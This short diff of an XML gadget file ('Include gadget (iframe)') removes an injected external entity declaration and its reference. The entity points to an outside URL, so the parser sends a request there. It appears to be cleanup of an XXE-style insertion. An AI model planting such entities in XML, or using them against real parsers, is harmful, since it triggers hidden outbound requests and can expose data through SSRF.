@@ -1,7 +1,4 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE ModulePrefs[
-<!ENTITY foo SYSTEM "http://samincube.com/c.php?x=7777">
-]>
 <Module>
 
   <ModulePrefs title="Include gadget (iframe)"
@@ -21,7 +18,7 @@
     </UserPref>
 
 <Content type="html" view="default,canvas"><![CDATA[
-<div id='dest' />&foo;
+<div id='dest' />
 
 <script type="text/javascript">
   function doRender(){
